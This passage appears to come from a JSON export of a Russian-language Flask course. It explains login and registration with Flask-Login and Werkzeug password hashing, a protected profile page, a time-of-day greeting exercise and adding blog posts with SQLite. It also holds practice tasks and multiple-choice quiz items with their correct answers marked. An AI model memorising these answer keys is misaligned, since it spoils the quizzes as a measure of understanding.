кодом.</p><p><code>render_template</code></p><p>Функция, которая берет файл HTML из папки templates, подставляет в него нужные переменные из Python и превращает всё это в готовую веб-страницу для браузера.</p><p><code>redirect</code></p><p>Команда, которая заставляет браузер пользователя автоматически перейти по другому адресу. Используется, например, для перенаправления на страницу входа после успешной регистрации.</p><p><code>url_for</code></p><p>Умный генератор ссылок. Вместо того чтобы писать адрес вручную (например, \"/auth/login\"), вы указываете имя функции, и Flask сам вычисляет актуальный адрес. Это защищает ссылки от поломок при изменении структуры сайта.</p><p>request: Объект, который содержит все данные, пришедшие от пользователя. Через него мы получаем текст из полей форм, информацию о браузере и заголовки запроса.</p><p><code>flash</code></p><p>Система коротких уведомлений. Она позволяет «передать» сообщение на следующую страницу (например: «Пароль неверен»), показать его пользователю один раз и сразу удалить из памяти.</p><p>&nbsp;</p><p>Импорты из Werkzeug (Безопасность):</p><p><code>from werkzeug.security import generate_password_hash, check_password_hash</code></p><p><code>generate_password_hash</code></p><p>Математический алгоритм, который превращает обычный пароль в сложный зашифрованный «отпечаток» (хэш). Это гарантирует, что в базе данных не хранятся пароли в чистом виде.</p><p><code>check_password_hash</code></p><p>Функция для обратной проверки. Она берет хэш из базы и пароль, который ввел пользователь, и проверяет, совпадают ли они, не расшифровывая сам пароль.</p><p>&nbsp;</p><p>Импорты из Flask-Login (Управление доступом)</p><p><code>from flask_login import login_user, logout_user, login_required</code></p><p><code>login_user</code></p><p>Функция, которая «авторизует» пользователя. Она создает в браузере специальный шифрованный ключ (куки), благодаря которому сервер понимает, что человек уже ввел пароль.</p><p><code>logout_user</code></p><p>Удаляет данные о пользователе из текущей сессии, фактически осуществляя выход из учетной записи.</p><p><code>login_required</code></p><p>Декоратор (специальная пометка над функцией), который закрывает доступ к странице. Если анонимный пользователь попытается зайти на страницу под этой меткой, Flask-Login автоматически отправит его на страницу входа.</p><p>&nbsp;</p><p>Импорты внутри проекта (Локальные связи)</p><p><code>from .models import User</code></p><p>Точка перед models означает «ищи в текущей папке». Мы импортируем класс User, чтобы Python понимал структуру таблицы в базе данных и мог создавать новых пользователей или искать существующих.</p><p><code>from . import db</code></p><p>Мы берем объект базы данных из файла <code>__init__.py</code>. Это позволяет нам использовать одну и ту же базу данных во всех частях приложения (и в регистрации, и в профиле).</p><p>&nbsp;</p><p>Системные импорты:</p><p><code>import os</code></p><p>os: Стандартный модуль Python для работы с операционной системой. Мы используем его, чтобы прочитать секретные ключи и настройки из переменных окружения или файла .env. Это делается для того, чтобы не хранить важные пароли и ключи прямо внутри программного кода.</p><p>&nbsp;</p><p>2. Инициализация модуля (Blueprint)</p><p><code>auth = Blueprint('auth', __name__)</code></p><p>Эта строка создает «чертеж» приложения.</p><p>В больших проектах неудобно держать все функции в одном файле.</p><p>Блупринт позволяет изолировать логику авторизации.</p><p>Параметр 'auth' — это уникальное имя модуля, а __name__ указывает Flask, где физически на диске находятся связанные с этим модулем файлы.</p><p>&nbsp;</p><p>3. Маршрут регистрации (signup_post)</p><p><code>@auth.route('/signup', methods=['GET', 'POST'])</code></p><p><code>def signup_post():</code></p><p>Декоратор сообщает Flask, что функция обрабатывает два типа запросов:</p><p>GET: когда пользователь просто открывает страницу регистрации.</p><p>POST: когда пользователь нажимает кнопку «Зарегистрироваться» и отправляет данные.</p><p>&nbsp;</p><p>4. Извлечение данных:</p><p><code>email = request.form.get('email')</code></p><p><code>name = request.form.get('name')</code></p><p><code>password = request.form.get('password')</code></p><p>Объект request.form — это словарь, содержащий всё, что пользователь ввел в поля &lt;input&gt;. Мы используем .get(), чтобы приложение не «упало» с ошибкой, если какое-то поле окажется пустым.</p><p>&nbsp;</p><p>5. Поиск существующего пользователя:</p><p>(обратите внимание, что для взаимодействия с базой данных используется не язык SQL в чистом виде, но SQL-запросы, \"под капотом\",&nbsp; как бы оборачиваются объектно-ориентированным синтаксисом Python (технология ORM))</p><p><code>user = db.session.execute(db.select(User).filter_by(email=email)).scalar_one_or_none()</code></p><p>Здесь происходит запрос к базе данных:</p><p><code>db.select(User)</code> подготавливает SQL-команду SELECT * FROM user.</p><p><code>filter_by(email=email)</code> добавляет условие поиска по почте.</p><p><code>execute()</code> отправляет этот запрос в базу.</p><p><code>scalar_one_or_none()</code> — это фильтр результата. Если пользователь найден, он записывается в переменную user. Если нет — переменная становится None. Это предотвращает создание дубликатов аккаунтов.</p><p>&nbsp;</p><p>6. Безопасное сохранение пароля:</p><p><code>new_user = User(</code></p><p><code>&nbsp;&nbsp;&nbsp; email=email,</code></p><p><code>&nbsp;&nbsp;&nbsp; name=name,</code></p><p><code>&nbsp;&nbsp;&nbsp; password=generate_password_hash(password)</code></p><p><code>)</code></p><p>Мы создаем новый объект класса User.</p><p>Функция generate_password_hash берет «сырой» пароль (например, qwerty123) и с помощью сложных математических алгоритмов превращает его в длинную нечитаемую строку. Это нужно для того, чтобы даже при взломе базы данных злоумышленники не узнали реальные пароли.</p><p>&nbsp;</p><p>7. Фиксация данных:</p><p><code>db.session.add(new_user)</code></p><p><code>db.session.commit()</code></p><p><code>add()</code> кладет объект в «корзину» для подготовки, а commit() физически записывает данные в файл db.sqlite. Только после этой команды данные сохраняются навсегда.</p><p>&nbsp;</p><p>8. Маршрут входа (login_post)</p><p><code>@auth.route('/login', methods=['GET', 'POST'])</code></p><p><code>def login_post():</code></p><p>Здесь происходит проверка личности пользователя.</p><p>Логика проверки:</p><p><code>if not user or not check_password_hash(user.password, password)</code></p><p>Эта проверка состоит из двух этапов:</p><p><code>not user</code> - Проверяем, существует ли вообще человек с такой почтой в нашей базе.</p><p><code>not check_password_hash</code> - Поскольку мы не знаем оригинальный пароль, мы берем тот, что ввел пользователь сейчас, хэшируем его и сравниваем с тем хэшем, который уже лежит в базе. Если они совпадают — пароль верный.</p><p>&nbsp;</p><p>9. Запуск сессии:</p><p><code>login_user(user, remember=remember)</code></p><p>Это самая важная функция библиотеки Flask-Login. Она создает в браузере пользователя специальный шифрованный файл (Session Cookie). Благодаря этому сервер «узнаёт» пользователя при каждом переходе на новую страницу, и человеку не нужно вводить логин и пароль заново каждые 5 секунд.</p><p>&nbsp;</p><p>10. Перенаправление на страницу профиля:</p><p><code>return redirect(url_for('main.profile'))</code></p><p>Функция url_for вычисляет адрес страницы профиля по имени функции. Это лучше, чем писать путь /profile вручную, так как если вы решите изменить адрес страницы в будущем, вам не придется переписывать его во всем коде — Flask найдет его автоматически по имени функции profile.</p><p>&nbsp;</p><p>11. Функция выхода — самая простая в реализации, так как Flask-Login берет на себя всю работу по удалению сессионных куки пользователя.</p><p><code>@login_required</code></p><p>Мы добавляем этот декоратор, потому что выйти из системы может только тот, кто в нее уже вошел. Это защищает сервер от бессмысленных запросов.</p><p><code>logout_user()</code></p><p>Эта функция уничтожает сессию пользователя на стороне сервера и помечает куки в браузере как недействительные. После этого объект current_user снова станет анонимным.</p><p><code>redirect(url_for('main.index'))</code></p><p>После выхода мы отправляем пользователя на главную страницу, чтобы он видел, что доступ к защищенным разделам теперь закрыт.</p><p>&nbsp;</p><p>&nbsp;</p><p><strong>3. Шаблон страницы входа</strong></p><p>Используем Tailwind для создания чистого интерфейса.</p><p>Файл <code>project/templates/login.html</code>:</p><pre><code class=\"language-jinja2\">{% extends \"base.html\" %}\r\n \r\n{% block content %}\r\n&lt;div class=\"max-w-md mx-auto bg-white p-8 border border-gray-200 rounded-lg shadow-sm\"&gt;\r\n  &lt;h2 class=\"text-2xl font-bold text-center mb-6\"&gt;\r\n    Вход в систему\r\n  &lt;/h2&gt;\r\n  {% with messages = get_flashed_messages() %}\r\n  {% if messages %}\r\n  &lt;div class=\"bg-red-100 border border-red-400 text-red-700 px-4 py-3 rounded mb-4\"&gt;\r\n    {{ messages[0] }}\r\n  &lt;/div&gt;\r\n  {% endif %}\r\n  {% endwith %}\r\n \r\n  &lt;form method=\"POST\" action=\"/login\"&gt;\r\n    &lt;div class=\"mb-4\"&gt;\r\n      &lt;label class=\"block text-gray-700 text-sm font-bold mb-2\"&gt;\r\n        Email\r\n      &lt;/label&gt;\r\n      &lt;input type=\"email\"\r\n             name=\"email\"\r\n             class=\"w-full px-3 py-2 border rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500\"\r\n             required&gt;\r\n    &lt;/div&gt;\r\n \r\n    &lt;div class=\"mb-4\"&gt;\r\n      &lt;label class=\"block text-gray-700 text-sm font-bold mb-2\"&gt;\r\n        Пароль\r\n      &lt;/label&gt;\r\n      &lt;input type=\"password\"\r\n             name=\"password\"\r\n             class=\"w-full px-3 py-2 border rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500\"\r\n             required&gt;\r\n    &lt;/div&gt;\r\n \r\n    &lt;div class=\"mb-6 flex items-center\"&gt;\r\n      &lt;input type=\"checkbox\" name=\"remember\" class=\"mr-2\"&gt;\r\n      &lt;label class=\"text-sm text-gray-600\"&gt;Запомнить меня&lt;/label&gt;\r\n    &lt;/div&gt;\r\n \r\n    &lt;button type=\"submit\"\r\n      class=\"w-full bg-blue-500 text-white font-bold py-2 px-4 rounded hover:bg-blue-600 transition duration-300\"&gt;\r\n      Войти\r\n    &lt;/button&gt;\r\n  &lt;/form&gt;\r\n&lt;/div&gt;\r\n{% endblock %}</code></pre><p>Объяснение:</p><p><code>get_flashed_messages()</code></p><p>Эта функция извлекает сообщения, которые мы отправили через flash() в коде Python. Если пароль неверный — пользователь увидит красную плашку с текстом.</p><p>&nbsp;</p><p><strong>4. Защита профиля</strong></p><p>Теперь защитим страницу профиля так, чтобы на нее нельзя было попасть без авторизации.</p><p>Замените весь код в файле <code>project/main.py</code> на следующий:</p><pre><code class=\"language-python\">from flask import Blueprint, render_template\r\nfrom flask_login import login_required, current_user\r\nfrom . import db\r\n \r\nmain = Blueprint('main', __name__)\r\n \r\n@main.route('/')\r\ndef index():\r\n &nbsp;&nbsp; return render_template('index.html')\r\n \r\n@main.route('/profile')\r\n@login_required\r\ndef profile():\r\n &nbsp;&nbsp; # current_user.name доступен благодаря UserMixin в моделях\r\n &nbsp;&nbsp; return render_template('profile.html', name=current_user.name)</code></pre><p>Объяснение:</p><p><code>@login_required</code></p><p>Этот декоратор — «вышибала» на входе. Он автоматически проверяет, авторизован ли пользователь. Если нет — перекидывает на логин.</p><p><code>current_user</code></p><p>Глобальный объект во Фласке, который всегда содержит данные текущего пользователя. Мы передаем имя пользователя в шаблон.</p><p>&nbsp;</p><p>&nbsp;</p><h4>5. Страница профиля (profile.html)</h4><p>Теперь создадим страницу, которую мы защитили в предыдущей лекции. Здесь мы покажем данные пользователя, извлеченные из базы данных.</p><p>Создайте файл <code>project/templates/profile.html</code></p><pre><code class=\"language-jinja2\">{% extends \"base.html\" %}\r\n \r\n{% block content %}\r\n&lt;div class=\"max-w-2xl mx-auto\"&gt;\r\n  &lt;div class=\"bg-white shadow-sm border border-gray-200 rounded-lg p-8\"&gt;\r\n    &lt;div class=\"flex items-center space-x-4 mb-6\"&gt;\r\n      &lt;div class=\"bg-blue-500 text-white rounded-full h-16 w-16 flex items-center justify-center text-2xl font-bold\"&gt;\r\n        {{ name[0] | upper }}\r\n      &lt;/div&gt;\r\n      &lt;div&gt;\r\n        &lt;h1 class=\"text-3xl font-bold text-gray-900\"&gt;\r\n          Добро пожаловать, {{ name }}!\r\n        &lt;/h1&gt;\r\n        &lt;p class=\"text-gray-500\"&gt;\r\n          Личный кабинет\r\n        &lt;/p&gt;\r\n      &lt;/div&gt;\r\n    &lt;/div&gt;\r\n    &lt;div class=\"border-t border-gray-100 pt-6\"&gt;\r\n      &lt;h2 class=\"text-lg font-semibold mb-4\"&gt;\r\n        Данные аккаунта\r\n      &lt;/h2&gt;\r\n      &lt;div class=\"grid grid-cols-1 gap-4\"&gt;\r\n        &lt;div class=\"bg-gray-50 p-4 rounded-md\"&gt;\r\n          &lt;span class=\"text-sm text-gray-500 block\"&gt;\r\n            Электронная почта\r\n          &lt;/span&gt;\r\n          &lt;span class=\"font-medium text-gray-800\"&gt;\r\n            {{ current_user.email }}\r\n          &lt;/span&gt;\r\n        &lt;/div&gt;\r\n        &lt;div class=\"bg-gray-50 p-4 rounded-md\"&gt;\r\n          &lt;span class=\"text-sm text-gray-500 block\"&gt;\r\n            Статус доступа\r\n          &lt;/span&gt;\r\n          &lt;span class=\"text-green-600 font-medium italic\"&gt;\r\n            Авторизован через Flask-Login\r\n          &lt;/span&gt;\r\n        &lt;/div&gt;\r\n      &lt;/div&gt;\r\n    &lt;/div&gt;\r\n \r\n    &lt;div class=\"mt-8\"&gt;\r\n      &lt;a href=\"{{ url_for('main.index') }}\"\r\n         class=\"text-blue-500 hover:text-blue-600 transition duration-300\"&gt;\r\n        &amp;larr; Вернуться на главную\r\n      &lt;/a&gt;\r\n    &lt;/div&gt;\r\n  &lt;/div&gt;\r\n&lt;/div&gt;\r\n{% endblock %}</code></pre><p>&nbsp;Объяснение кода:</p><p><code>{{ name }}</code></p><p>Мы передали это значение из функции profile в файле main.py. Это имя пользователя, которое он указал при регистрации.</p><p><code>{{ current_user.email }}</code></p><p>Обратите внимание, что нам даже не нужно было передавать email из Python-кода. Поскольку Flask-Login делает объект current_user доступным во всех шаблонах, мы можем получить доступ к любому полю нашей модели User напрямую.</p><p>&nbsp;</p><h4>6. Тестирование приложения</h4><p>Запустите приложение командой&nbsp;</p><p><code>flask run</code></p><p>Вы увидите главную страницу приложения стилизованную css-фреймворком tailwind.</p><p>&nbsp;</p><p>Протестируйте весь функционал приложения:</p><p>- регистрация пользователя;</p><p>- вход (авторизация) пользователя;</p><p>- личный кабинет;</p><p>- выход из профиля.</p><p>Проверьте работу валидации пытаясь ввести некорректные данные.</p><p>&nbsp;</p><p>Обратите внимание на следующие моменты в логике навигации.</p><p>Благодаря Flask-Login и объекту current_user, интерфейс меняется динамически:</p><p>Если пользователь НЕ вошел (<code>if not current_user.is_authenticated</code>), он видит кнопки «Вход» и «Регистрация».</p><p>Как только срабатывает <code>login_user(user)</code>, состояние приложения меняется.</p><p>На всех страницах сайта теперь будут видны кнопки «Профиль» и «Выход».</p><p>Это называется «управление состоянием пользователя», и Flask-Login делает этот процесс максимально простым и безопасным.</p><p>&nbsp;</p><p>&nbsp;</p><p style=\"text-align:center;\">Поздравляем!</p><p style=\"text-align:center;\">Вы успешно создали современное приложение с полноценной аутентификацией.</p><p>&nbsp;</p><p>&nbsp;</p><p>Давайте подведем итоги того, что мы внедрили:</p><p>- Безопасное хэширование.</p><p>Мы никогда не храним пароли в виде текста. Мы используем Werkzeug для создания хэшей, которые невозможно взломать простым перебором.</p><p>- SQLAlchemy 2.0.</p><p>Мы применили актуальный синтаксис (db.select) и типизацию моделей, что защищает код от ошибок и делает его производительным.</p><p>- Переменные окружения (.env).</p><p>Мы научились прятать секретные ключи приложения от посторонних глаз.</p><p>- Автоматическое применение стилей CSS (Tailwind).</p><p>Мы создали профессиональный интерфейс без написания сотен строк CSS-кода.</p><p>- Защита маршрутов.</p><p>С помощью декоратора @login_required мы гарантируем, что личные данные пользователей не увидит никто посторонний.</p><p>&nbsp;</p><p>Что делать дальше? В реальных современных коммерческих проектах рекомендуется также внедрять:</p><p>- Двухфакторную аутентификацию (2FA) через мобильные приложения.</p><p>- Восстановление пароля через отправку токена на электронную почту.</p><p>- Ограничение количества попыток входа для защиты от ботов.</p><p>&nbsp;</p><p style=\"text-align:center;\"><strong>Это конец курса!</strong></p><p style=\"text-align:center;\"><strong>Удачи в разработке современных веб-приложений на Python и Flask!</strong></p><p>&nbsp;</p>"
            },
            "is_published": true
        },
        {
            "id": 21,
            "section_id": 5,
            "number": 1,
            "name": "Приложение \"Приветствие зависящее от времени суток\"",
            "slug": "greeting-by-time-of-day",
            "content": {
                "tasks": [
                    {
                        "id": 1,
                        "content": "<p>Стилизуйте главную страницу этого приложения так, чтобы в зависимости от времени суток менялся также цвет фона страницы.</p><p><span style=\"font-family:;\">(например, утро — синий, день — зелёный, вечер — оранжевый, ночь — тёмно-фиолетовый).</span></p>"
                    },
                    {
                        "id": 2,
                        "content": "<p>Вынесите логику определения приветствия в отдельную функцию Python и используйте её внутри index().</p>"
                    },
                    {
                        "id": 3,
                        "content": "<p>Добавьте в шаблон условие Jinja2, которое выводит дополнительное сообщение только ночью (например, совет отдохнуть).</p>"
                    }
                ],
                "tests": [],
                "theory_html": "<p>Попробуем создать несколько простых приложений для расширения, повторения и закрепления навыков работы с фреймворком Flask в т.ч. с базами данных.&nbsp;</p><p>&nbsp;</p><h4>Задание</h4><p>Напишите&nbsp;Flask-приложение, которое выводит в шаблон&nbsp;index.html&nbsp;приветствие для пользователя. Приветствие зависит от времени суток:</p><p>С 6:00 до 12:00 – «Доброе утро»</p><p>С 12:00 до 18:00 – «Добрый день»</p><p>С 18:00 до 24:00 – «Добрый вечер»</p><p>С 00:00 до 6:00 – «Доброй ночи»</p><p>&nbsp;</p><h4>Реализация</h4><p>Код для&nbsp;app.py&nbsp;выглядит так:</p><pre><code class=\"language-python\">from flask import Flask, render_template\r\nimport datetime\r\n \r\napp = Flask(__name__)\r\n \r\n@app.route('/')\r\ndef index():\r\n  now = datetime.datetime.now()\r\n  if now.hour &gt;= 6 and now.hour &lt; 12:\r\n    greeting = 'Доброе утро'\r\n  elif now.hour &gt;= 12 and now.hour &lt; 18:\r\n    greeting = 'Добрый день'\r\n  elif now.hour &gt;= 18 and now.hour &lt; 24:\r\n    greeting = 'Добрый вечер'\r\n  else:\r\n    greeting = 'Доброй ночи'\r\n  return render_template('index.html', greeting=greeting)\r\n \r\nif __name__ == '__main__':\r\n  app.run(debug=True)</code></pre><p>&nbsp;</p><p>Код шаблона index.html :</p><pre><code class=\"language-jinja2\">&lt;!DOCTYPE html&gt;\r\n&lt;html lang=\"ru\"&gt;\r\n&lt;body&gt;\r\n  &lt;div&gt;\r\n    &lt;h1&gt;{{ greeting }}, user!&lt;/h1&gt;\r\n    &lt;p&gt;Добро пожаловать на сайт.&lt;/p&gt;\r\n  &lt;/div&gt;\r\n&lt;/body&gt;\r\n&lt;/html&gt;</code></pre><p>Этот код не будет поясняться и комментироваться. Внимательно проанализируйте код и поймите как он работает, и что делает каждая строчка. Если будут возникать вопросы как работает или что делает тот или иной участок кода, вы всегда можете задать этот вопрос в ChatGPT.</p><p>Для тестирования приложения в разном времени можно жёстко задать часы в коде.</p><p>&nbsp;</p>"
            },
            "is_published": true
        },
        {
            "id": 16,
            "section_id": 2,
            "number": 3,
            "name": "Добавление новых постов",
            "slug": "add-new-post",
            "content": {
                "tasks": [
                    {
                        "id": 1,
                        "content": "<p><span style=\"font-family:;\">Измените маршрут /create так, чтобы при попытке отправки формы с пустым полем content пользователю также отображалось flash-сообщение с ошибкой.</span></p>"
                    },
                    {
                        "id": 2,
                        "content": "<p><span style=\"font-family:;\">Добавьте в функцию create() проверку длины заголовка поста:</span><br><span style=\"font-family:;\">если длина title меньше 5 символов, пост не сохраняется, а пользователю показывается сообщение об ошибке.</span></p>"
                    },
                    {
                        "id": 3,
                        "content": "<p>Измените маршрут /create, чтобы после успешного добавления поста отображалось flash-сообщение «Пост успешно создан» зелёного цвета.</p>"
                    },
                    {
                        "id": 4,
                        "content": "<p><span style=\"font-family:;\">Добавьте в шаблон create.html HTML-валидацию:</span><br><span style=\"font-family:;\">сделайте поле заголовка обязательным с помощью атрибута required.</span></p>"
                    },
                    {
                        "id": 5,
                        "content": "<p><span style=\"font-family:;\">Добавьте ограничение: один пост не может содержать более 1000 символов в поле content.</span><br><span style=\"font-family:;\">При превышении лимита пользователь должен увидеть flash-сообщение.</span></p>"
                    }
                ],
                "tests": [
                    {
                        "id": 1,
                        "options": [
                            "Для указания секретного ключа базы данных",
                            "Для работы механизма flash-сообщений и сессий Flask ",
                            "Для шифрования SQL-запросов с помощью секретного ключа",
                            "Для включения режима отладки"
                        ],
                        "question": "Зачем в приложении задаётся параметр app.config['SECRET_KEY']?",
                        "correct_index": 1
                    },
                    {
                        "id": 2,
                        "options": [
                            "Вернётся пустой HTML-шаблон",
                            "Произойдёт автоматическое перенаправление на главную страницу",
                            "Будет вызвано исключение 404 с помощью abort(404) ",
                            "Приложение завершит работу"
                        ],
                        "question": "Что произойдёт, если функция get_post(post_id) не найдёт запись с указанным идентификатором?",
                        "correct_index": 2
                    },
                    {
                        "id": 3,
                        "options": [
                            "Отображает страницу ошибки",
                            "Обновляет текущую страницу",
                            "Перенаправляет пользователя на главную страницу ",
                            "Создаёт URL для маршрута index и перенаправляет на него "
                        ],
                        "question": "Какую роль выполняет redirect(url_for('index')) после успешного создания поста?",
                        "correct_index": 2
                    }
                ],
                "theory_html": "<p>Добавьте в ваше веб-приложение возможность создавать в блоге новые посты.</p><p>&nbsp;</p><p>1. Создадим функционал создания новых постов.</p><p>Откройте файл app.py.&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</p><p>Замените содержимое файла следующим кодом:</p><pre><code class=\"language-python\">import sqlite3\r\nfrom flask import Flask, render_template, request, url_for, flash, redirect\r\nfrom werkzeug.exceptions import abort\r\n\r\ndef get_db_connection():\r\n &nbsp;&nbsp; conn = sqlite3.connect('database.db')\r\n &nbsp;&nbsp; conn.row_factory = sqlite3.Row\r\n &nbsp;&nbsp; return conn\r\n\r\ndef get_post(post_id):\r\n &nbsp;&nbsp; conn = get_db_connection()\r\n &nbsp;&nbsp; post = conn.execute('SELECT * FROM posts WHERE id = ?',\r\n &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; (post_id,)).fetchone()\r\n &nbsp;&nbsp; conn.close()\r\n &nbsp;&nbsp; if post is None:\r\n &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; abort(404)\r\n &nbsp;&nbsp; return post\r\n\r\n\r\napp = Flask(__name__)\r\n\r\napp.config['SECRET_KEY'] = 'your secret key'\r\n\r\n\r\n@app.route('/')\r\ndef index():\r\n &nbsp;&nbsp; conn = get_db_connection()\r\n &nbsp;&nbsp; posts = conn.execute('SELECT * FROM posts').fetchall()\r\n &nbsp;&nbsp; conn.close()\r\n &nbsp;&nbsp; return render_template('index.html', posts=posts)\r\n\r\n@app.route('/&lt;int:post_id&gt;')\r\ndef post(post_id):\r\n &nbsp;&nbsp; post = get_post(post_id)\r\n &nbsp;&nbsp; return render_template('post.html', post=post)\r\n\r\n@app.route('/create', methods=('GET', 'POST'))\r\ndef create():\r\n &nbsp;&nbsp; return render_template('create.html')\r\n\r\n\r\nif __name__ == \"__main__\" :\r\n &nbsp; app.run(debug = True)</code></pre><p>В этом коде дополнительно:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</p><p>Импортируются:</p><p>- глобальный объект request, необходимый для доступа к данным, передающимся через HTML-форму;</p><p>- функция url_for(), необходимая для формирования URL-адресов;</p><p>- функция flash(), необходимая для отображения сообщения при обработке запроса;</p><p>- функция redirect(), необходимая для перенаправления клиента на другую страницу.</p><p>Через объект app.config добавляется конфигурация секретного ключа SECRET_KEY, необходимая для работы функции flash(), чтобы хранить всплывающие сообщения в сеансе браузера клиента. Секретный ключ представляет собой длинную строку случайных символов. Он используется для создания защищенных сеансов и позволяет Flask запоминать информацию между запросами, например, переходить от страницы создания нового поста к главной странице приложения. Пользователь может получить доступ к информации, хранящейся в сеансе, но не может изменить ее без секретного ключа. Поэтому никогда не передавайте никому доступ к вашему секретному ключу.&nbsp;</p><p>Функция визуализации create() возвращает сформированный из шаблона create.html HTML-код страницы создания поста блога. Декоратор создает маршрут /create, который принимает GET и POST-запросы. По умолчанию принимаются только GET-запросы. Для того чтобы маршрут также принимал POST-запросы, которые используются браузером при передаче данных форм, в аргументе methods передается кортеж с допустимыми типами запросов.</p><p>Сохраните и закройте файл app.py.</p><p>&nbsp;</p><p>2. Создайте страницу, на которой пользователь сможет написать новый пост, состоящий из заголовка и содержания.</p><p>Создайте и откройте файл-шаблон create.html в директории templates.</p><p>Добавьте в файл следующий код:</p><pre><code class=\"language-jinja2\">{% extends 'base.html' %}\r\n\r\n{% block content %}\r\n&lt;h1&gt;{% block title %} Создание нового поста {% endblock %}&lt;/h1&gt;\r\n&lt;form method=\"post\"&gt;\r\n  &lt;div class=\"mb-3\"&gt;\r\n    &lt;label for=\"title\" class=\"col-sm-2 col-form-label\"&gt;\r\n      Заголовок\r\n    &lt;/label&gt;\r\n    &lt;input type=\"text\"\r\n          name=\"title\"\r\n          placeholder=\"Заголовок поста\"\r\n          class=\"form-control\"\r\n          value=\"{{ request.form.get('title', '') }}\"&gt;\r\n  &lt;/div&gt;\r\n  &lt;div class=\"mb-3\"&gt;\r\n    &lt;label for=\"content\" class=\"col-sm-2 col-form-label\"&gt;\r\n      Содержание\r\n    &lt;/label&gt;\r\n    &lt;textarea name=\"content\"\r\n              placeholder=\"Содержание поста\"\r\n              class=\"form-control\"\r\n              rows=\"3\"&gt;\r\n      {{ request.form.get('content', '') }}\r\n    &lt;/textarea&gt;\r\n  &lt;/div&gt;\r\n  &lt;div class=\"mb-3\"&gt;\r\n    &lt;button type=\"submit\" class=\"btn btn-primary\"&gt;\r\n      Подтвердить\r\n    &lt;/button&gt;\r\n  &lt;/div&gt;\r\n&lt;/form&gt;\r\n{% endblock %}\r\n</code></pre><p>В основном это обычный HTML-код, который будет отображать поля для ввода заголовка и основного текста будущего поста, а также кнопку для отправки формы.<br>Значение заголовка поста сохраняется в объекте <span style=\"font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;font-size:14.0pt;\"><code>{{ request.form.get('title', '') }}</code></span>,&nbsp;</p><p>а значение содержания — в объекте <code>{{ request.form.get('content', '') }}</code>.&nbsp;</p><p>Это сделано для того, чтобы вводимые вами данные не потерялись, если что-то пойдет не по плану. Например, если вы напишете основной текст поста, но забудете указать заголовок, отобразится сообщение о том, что заголовок является обязательным для заполнения полем. При этом вы не потеряете уже введенный основной текст, так как он будет сохранен в глобальном объекте request, к которому у вас есть доступ в шаблонах.<br>Сохраните и закройте файл create.html.</p><p>&nbsp;</p><p>3. Откройте URL <code>127.0.0.1:5000/create</code> и убедитесь, что отображается страница \"Создание нового поста\" с полями для заголовка и содержания поста, а также кнопкой для отправки формы.</p><p>Форма с этой страницы отправляет POST-запрос в функцию визуализации create(). Но в функции сейчас отсутствует код обработки POST-запроса, поэтому после заполнения и отправки формы введенные данные не будут сохранены в БД.</p><p>Исправьте это, изменив функцию визуализации create().</p><p>&nbsp;</p><p>4. Откройте файл app.py.</p><p>Замените содержимое функции визуализации create() на следующий код:</p><pre><code class=\"language-python\">@app.route('/create', methods=('GET', 'POST'))\r\ndef create():\r\n  if request.method == 'POST':\r\n    title = request.form['title']\r\n    content = request.form['content']\r\n    if not title:\r\n      flash('Требуется заголовок поста')\r\n    else:\r\n      conn = get_db_connection()\r\n      conn.execute(\r\n         'INSERT INTO posts (title, content) VALUES (?, ?)',\r\n         (title, content)\r\n      )\r\n      conn.commit()\r\n      conn.close()\r\n      return redirect(url_for('index'))\r\n  return render_template('create.html')</code></pre><p>В коде этой функции:</p><p>Условие if request.method == 'POST' обеспечивает, чтобы код выполнялся только в отношении POST-запросов.</p><p>Из глобального объекта request.form, содержащего данные формы, извлекаются отправленные в полях формы заголовок и содержание нового поста.</p><p>Если в форме не задан заголовок поста, будет выполнено условие if not title, и пользователь увидит сообщение с информацией о необходимости заполнения поля заголовка.</p><p>Если заголовок указан:</p><p>- с помощью функции get_db_connection() открывается подключение к БД, и в таблицу posts добавляется запись о новом посте, содержащая полученные через форму заголовок и текст поста;</p><p>- изменения фиксируются, соединение закрывается;</p><p>- с помощью функции redirect() пользователь перенаправляется на главную страницу приложения.</p><p>Сохраните и закройте файл app.py.</p><p>&nbsp;</p><p>5. Откройте URL <code>127.0.0.1:5000/create</code>, введите заголовок и содержание поста и отправьте форму. После отправки формы вы будете перенаправлены на главную страницу приложения, где вы увидите список всех постов, включая новый.</p><p>&nbsp;</p><p>6. В шаблоне base.html добавьте отображение всплывающего сообщения и добавьте на панель навигации ссылку на форму создания нового поста.</p><p>Откройте шаблон base.html:</p><p>Замените весь код тэга &lt;nav&gt; следующим кодом:</p><p><span style=\"font-size:10.0pt;\">(остальной код не меняйте)</span></p><pre><code class=\"language-jinja2\">&lt;nav class=\"navbar navbar-expand-lg bg-light\"&gt;\r\n  &lt;div class=\"container-fluid\"&gt;\r\n    &lt;a class=\"navbar-brand\" href=\"{{ url_for('index')}}\"&gt;\r\n      FlaskBlog\r\n    &lt;/a&gt;\r\n    &lt;button class=\"navbar-toggler\"\r\n    type=\"button\"\r\n    data-bs-toggle=\"collapse\"\r\n    data-bs-target=\"#navbarSupportedContent\"\r\n    aria-controls=\"navbarSupportedContent\"\r\n    aria-expanded=\"false\"\r\n    aria-label=\"Toggle navigation\"&gt;\r\n      &lt;span class=\"navbar-toggler-icon\"&gt;&lt;/span&gt;\r\n    &lt;/button&gt;\r\n    &lt;div class=\"collapse navbar-collapse\" id=\"navbarSupportedContent\"&gt;\r\n      &lt;ul class=\"navbar-nav me-auto mb-2 mb-lg-0\"&gt;\r\n        &lt;li class=\"nav-item\"&gt;\r\n          &lt;a class=\"nav-link active\" href=\"{{url_for('create')}}\"&gt;\r\n            Новый пост\r\n          &lt;/a&gt;\r\n        &lt;/li&gt;\r\n        &lt;li class=\"nav-item\"&gt;\r\n          &lt;a class=\"nav-link active\" href=\"#\"&gt;\r\n            О приложении\r\n          &lt;/a&gt;\r\n        